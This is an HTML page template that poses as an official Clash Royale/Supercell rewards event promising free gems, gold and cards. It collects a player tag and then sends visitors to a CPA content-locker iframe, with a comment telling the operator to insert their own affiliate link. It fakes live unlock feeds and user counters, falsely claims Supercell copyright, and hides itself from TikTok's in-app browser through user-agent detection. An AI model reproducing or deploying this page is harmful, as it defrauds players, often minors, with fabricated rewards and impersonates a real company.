<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale Rewards - Official</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --cr-blue-sky: #30a2ff; /* Azraq mftouh */
            --cr-yellow-bright: #ffde00; /* Sfiri d-l-gold */
            --cr-green-battle: #62d500; /* Khdar d-l-battle */
            --card-light-brown: #f3e5ab; /* Loun khfif d-l-khshab */
            --text-shadow: 2px 2px 0px #000;
        }

        body {
            margin: 0; padding: 0;
            background-color: var(--cr-blue-sky);
            font-family: 'Lilita One', cursive;
            color: white; text-align: center;
            background-image: url('https://www.transparenttextures.com/patterns/cubes.png');
            overflow-x: hidden;
        }

        /* TikTok Protection Overlay */
        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 999999; }
        #tutorialGif { width: 100%; height: 100%; object-fit: contain; }

        /* Live Header */
        .live-bar { 
            background: rgba(0, 84, 166, 0.8); 
            padding: 10px 0; font-size: 14px; 
            border-bottom: 4px solid var(--cr-yellow-bright);
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        #liveText span { color: var(--cr-yellow-bright); text-decoration: underline; }

        .logo-container { margin: 30px 0; }
        .logo { width: 240px; filter: drop-shadow(0 8px 0px rgba(0,0,0,0.2)); }

        /* Stats Panel - Modern & Clean */
        .stats-panel {
            background: #fff; border-radius: 20px;
            display: inline-flex; gap: 30px; padding: 15px 40px; 
            margin-bottom: 30px; border: 4px solid #0054a6;
            box-shadow: 0 8px 0 #003a73;
        }
        .stat-box { display: flex; flex-direction: column; align-items: center; color: #0054a6; }
        .stat-val { font-size: 26px; color: #ff8000; -webkit-text-stroke: 1px #000; }

        /* Rewards Grid */
        .container { width: 95%; max-width: 550px; margin: 0 auto; }
        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; padding: 10px; }
        
        .card {
            background: linear-gradient(180deg, #ffffff 0%, #e8f4ff 100%);
            border: 5px solid #0054a6; border-radius: 25px;
            padding: 20px 10px; position: relative; 
            box-shadow: 0 10px 0 #003a73;
            transition: transform 0.2s;
        }
        .card:active { transform: translateY(5px); box-shadow: 0 5px 0 #003a73; }

        .item-name { color: #0054a6; font-size: 16px; margin-bottom: 15px; height: 40px; }
        .img-box { height: 110px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
        .item-img { max-width: 100%; max-height: 100%; filter: drop-shadow(0 5px 5px rgba(0,0,0,0.1)); }

        .btn-claim {
            background: linear-gradient(180deg, #7cfc00 0%, #4ea100 100%);
            border: none; border-bottom: 6px solid #2d5d00; border-radius: 15px;
            color: white; font-size: 22px; width: 100%; padding: 12px 0;
            cursor: pointer; font-family: 'Lilita One', cursive;
            text-shadow: var(--text-shadow);
        }

        /* Modals */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); display: none; justify-content: center; 
            align-items: center; z-index: 10000; backdrop-filter: blur(8px);
        }
        .modal-box {
            background: #fff; width: 85%; max-width: 400px;
            border: 8px solid #0054a6; border-radius: 35px;
            padding: 30px; position: relative; color: #0054a6;
        }
        .input-wrapper {
            background: #f0f8ff; border: 4px solid #0054a6;
            border-radius: 15px; padding: 15px; margin: 25px 0;
        }
        .modal-input { 
            background: transparent; border: none; color: #0054a6; width: 100%; 
            font-family: 'Lilita One', cursive; font-size: 24px; text-align: center; outline: none; 
        }

        .btn-continue {
            background: linear-gradient(180deg, #ffde00 0%, #ff8000 100%);
            border: none; border-bottom: 8px solid #b35900; border-radius: 20px;
            color: white; font-size: 32px; width: 100%; padding: 15px 0;
            text-shadow: var(--text-shadow); cursor: pointer; font-family: 'Lilita One', cursive;
        }

        .locker-frame {
            background: #fff; border-radius: 20px; height: 450px; 
            margin-top: 20px; border: 3px solid #ddd; overflow: hidden;
        }

        footer { margin-top: 60px; background: #003a73; padding: 40px; font-size: 12px; }
    </style>
</head>
<body onclick="document.getElementById('ttOverlay').style.display='none'">

    <div id="ttOverlay">
        <img src="tutorial.gif" id="tutorialGif" alt="Use Browser">
    </div>

    <div class="live-bar">
        <span id="liveText">🔥 <b>Player_88</b> just unlocked <span>EVO PEKKA!</span></span>
    </div>

    <div class="logo-container">
        <img src="https://link.clashroyale.com/images/cr-logo-white.png" class="logo">
    </div>

    <div class="stats-panel">
        <div class="stat-box">
            <span style="font-size: 12px;">GIFTS SENT</span>
            <span class="stat-val" id="claimed">12,450</span>
        </div>
        <div class="stat-box">
            <span style="font-size: 12px;">ACTIVE NOW</span>
            <span class="stat-val" id="online">3,102</span>
        </div>
    </div>

    <div class="container">
        <h2 style="text-shadow: var(--text-shadow); font-size: 28px; margin-bottom: 25px;">2026 SEASON REWARDS</h2>
        <div class="grid" id="mainGrid"></div>
    </div>

    <!-- Modal 1 -->
    <div class="modal-overlay" id="modalTag">
        <div class="modal-box">
            <h2 style="margin-top:0;">ACCOUNT TAG</h2>
            <p>Enter your Player Tag to link your rewards</p>
            <div class="input-wrapper">
                <input type="text" class="modal-input" id="playerTag" placeholder="#P8LVQ..." maxlength="12">
            </div>
            <button class="btn-continue" onclick="goToLocker()">CONTINUE</button>
        </div>
    </div>

    <!-- Modal 2 (Locker) -->
    <div class="modal-overlay" id="modalLocker">
        <div class="modal-box">
            <h2 style="margin-top:0;">VERIFICATION</h2>
            <p style="font-size: 14px;">Complete one task below to unlock your items instantly.</p>
            <div class="locker-frame">
                <!-- BEDDEL L-LINK DYAL CPA DYALK HNA -->
                <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
            </div>
        </div>
    </div>

    <footer>
        <img src="https://supercell.com/images/800/logo_supercell@2x.png" width="80"><br><br>
        <p>&copy; 2026 Supercell Oy. Safe & Fair Play.<br>This is a promotional reward event.</p>
    </footer>

    <script>
        // Hada l-list dya ga3 dakchi li hype daba f 2026
        const rewardsData = [
            {n: "EVOLVED PEKKA", q: "LEVEL MAX", img: "pekka_evo.png"},
            {n: "DAGGER DUCHESS", q: "X1 UNIT", img: "duchess.png"},
            {n: "10,000 GEMS", q: "INSTANT", img: "gems.png"},
            {n: "LITTLE PRINCE", q: "CHAMPION", img: "prince.png"},
            {n: "ROYAL WILD CHEST", q: "X5", img: "chest_royal.png"},
            {n: "PASS ROYALE PLUS", q: "SEASON 80", img: "pass.png"},
            {n: "1,000,000 GOLD", q: "MAX", img: "gold.png"},
            {n: "EVO WIZARD", q: "6 SHARDS", img: "wizard_evo.png"}
        ];

        const grid = document.getElementById('mainGrid');
        rewardsData.forEach(r => {
            grid.innerHTML += `
                <div class="card">
                    <div class="item-name">${r.n}</div>
                    <div class="img-box"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/110?text=Item'"></div>
                    <button class="btn-claim" onclick="openTagModal()">CLAIM</button>
                </div>`;
        });

        function openTagModal() { document.getElementById('modalTag').style.display = 'flex'; }
        
        function goToLocker() {
            const tag = document.getElementById('playerTag').value;
            if(tag.length > 3) {
                document.getElementById('modalTag').style.display = 'none';
                document.getElementById('modalLocker').style.display = 'flex';
            }
        }

        // Live Feed Effect
        const users = ["Omar_CR", "Yassine_Pro", "King_Me", "Sara_Royale", "Dragon_X", "Elite_1", "Zenix_CR"];
        const items = ["GEMS", "EVO PEKKA", "PASS ROYALE", "LITTLE PRINCE"];
        
        setInterval(() => {
            const feed = document.getElementById('liveText');
            feed.style.opacity = '0';
            setTimeout(() => {
                const u = users[Math.floor(Math.random()*users.length)];
                const i = items[Math.floor(Math.random()*items.length)];
                feed.innerHTML = `👑 <b>${u}</b> just unlocked <span>${i}!</span>`;
                feed.style.opacity = '1';
            }, 500);
        }, 3500);

        // TikTok Protection
        window.addEventListener("load", () => {
            if (/TikTok|Bytedance/i.test(navigator.userAgent)) {
                document.getElementById("ttOverlay").style.display = "block";
            }
        });
    </script>
</body>
</html>
